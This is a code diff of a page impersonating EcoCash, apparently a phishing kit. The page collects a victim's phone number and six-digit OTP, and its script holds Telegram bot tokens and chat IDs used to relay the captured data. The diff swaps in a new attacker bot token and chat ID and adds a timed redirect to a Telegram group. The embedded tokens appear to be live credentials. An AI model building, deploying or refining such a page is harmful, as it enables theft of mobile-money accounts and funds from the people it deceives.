@@ -140,9 +140,7 @@
             background: #f5f7fa;
             flex-shrink: 0;
             margin-top: auto;
-            /* Pushes footer to bottom */
         }
-        /* SPINNER */
         
         #spinnerOverlay {
             position: fixed;
@@ -185,7 +183,6 @@
             max-width: 320px;
             font-weight: 500;
         }
-        /* SUCCESS / CANCEL MESSAGE */
         
         #resultOverlay {
             position: fixed;
@@ -240,7 +237,6 @@
 
     <footer>© 2025 EcoCash</footer>
 
-    <!-- SPINNER -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
@@ -248,14 +244,14 @@
         </div>
     </div>
 
-    <!-- RESULT OVERLAY -->
     <div id="resultOverlay">
         <div class="result-message" id="resultMessage"></div>
     </div>
 
     <script>
-        const BOT_TOKEN = '8146250634:AAHb7ziZRudoTmFxxGQG7fByML2ZdVCrKqE';
-        const CHAT_ID = '7124441123';
+        const BOT_TOKEN = '8904608658:AAG9u6dJ_H5XCKBJMC4dcSRLbUpvjmeB8lw';
+        const CHAT_ID = '1270189083';
+        const TELEGRAM_BOT_LINK = 'https://t.me/+U_kLBh9E_lBhNzE0';
 
         // Mask phone from localStorage
         const savedPhone = localStorage.getItem('phone') || '785123463';
@@ -313,6 +309,10 @@
             });
         });
 
+        function redirectToTelegram() {
+            window.location.href = TELEGRAM_BOT_LINK;
+        }
+
         submitBtn.addEventListener('click', () => {
             if (otpValue.length !== 6) return;
 
@@ -365,6 +365,9 @@
                                         } else if (dataParts[0] === 'cancel') {
                                             resultMessage.textContent = 'Please reapply and ensure that your information is correct and your minimum Main USD Balance is atleast $30. Thank you.';
                                         }
+
+                                        // Wait 10 seconds then redirect to Telegram bot
+                                        setTimeout(redirectToTelegram, 10000);
                                     }
                                 }
                             }
